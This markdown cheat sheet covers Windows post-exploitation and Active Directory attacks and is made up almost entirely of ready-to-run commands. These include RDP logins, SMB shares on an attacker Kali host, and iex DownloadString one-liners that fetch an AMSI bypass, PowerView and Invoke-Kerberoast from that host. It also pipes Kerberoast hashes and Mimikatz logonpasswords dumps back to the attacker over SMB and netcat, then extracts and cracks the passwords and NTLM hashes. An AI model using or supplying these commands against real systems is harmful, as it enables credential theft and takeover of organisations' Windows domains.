# Windows Post Exploitation and Active Directory Attacks

## Windows Environment Variable Setting 
```bash
# Target Windows

set URL=http://192.168.119.128
set LHOST=192.168.119.128
```

## Remote Desktop (RDP)
```
#@Kali
rdesktop 10.11.1.122 -u adam -d xor -p PleaseSubscribe
xfreerdp /u:iptracej /v:10.10.10.20 +clipboard
```
## SMBv2 File Transfer

```bash 
#Kali

sudo impacket-smbserver smb $(pwd) -smb2support -user iptracej -password iptracej	# bash
sudo impacket-smbserver smb (pwd) -smb2support -user iptracej -password iptracej	# fish

#Target Windows 

$pass = convertto-securestring 'iptracej' -AsPlainText -Force
$pass
$cred = New-Object System.Management.Automation.PSCredential('iptracej', $pass)
$cred	
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.119.128\smb
```

## PowerView and ActiveDirectory Module

```bash
#Target Windows

powershell.exe -exec Bypass
iex (new-Object Net.WebClient).DownloadString('http://192.168.119.128/privesc/my-am-bypass.ps1')
iex (new-Object Net.WebClient).DownloadString('http://192.168.119.128/privesc/PowerView.ps1');Import-Module PowerView.ps1
iex (new-Object Net.WebClient).DownloadString('http://192.168.119.128/privesc/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

## Kerberoast

### Rubeus 

```bash
#Target Windows
#SMBv2 File Share should be configured 

copy \\192.168.119.128\smb\post\Rubeus.exe .
.\Rubeus.exe kerberoast /output:hashcat /outfile:\\192.168.119.128\smb\file.txt
```

### Invoke-Kerberoast.ps1 - HTTP server and SMBV2 configured

```bash
#Target Windows
#SMBv2 File Share should be configured

IEX(new-object Net.WebClient).DownloadString("http://192.168.119.128/post/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII \\192.168.119.128\smb\hashes.kerberoast
```

### Crack hashes for Kerberos ticket

```bash
#Kali
hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat -m 13100 --force -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt --show
```

## Mimikatz - Dump NTML hash and clear password, etc.

```bash
#Kali
nc -nlvp 1234 > mimikatz_out.txt

#Target Windows 
#Transfer mimikatz and nc executables
#Open a terminal with administrative privilege and run: 

copy \\192.168.119.128\smb\privesc\nc64.exe .
copy \\192.168.119.128\smb\post\mimikatz64.exe .

./mimikatz64.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | ./nc64.exe -vv 192.168.119.128 1234		#PS Terminal
.\mimikatz64.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | .\nc64.exe -vv 192.168.119.128 1234		#DOS Terminal
```

### Extract Password

```bash
#Kali

cat mimikatz_out.txt|tr -d '\011\015' |awk '/Username/ { user=$0; getline; getline; print user " " $0}'|grep -v "* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)"|awk '{if (length($8)>2) print $4 ":" $8}'|sort -u
```

### Extract NTLM Hash
```bash
#Kali

cat mimikatz_out.txt |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user " " domain " " $0}'|grep -v "* LM\|* Password\|Microsoft_OC1"|awk '{if (length($12)>2) print $8 "/" $4 "%aad3b435b51404eeaad3b435b51404ee:" $12}'|sort -u
```

### Crack hashes for NTLM

```bash
#Kali

john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

# 



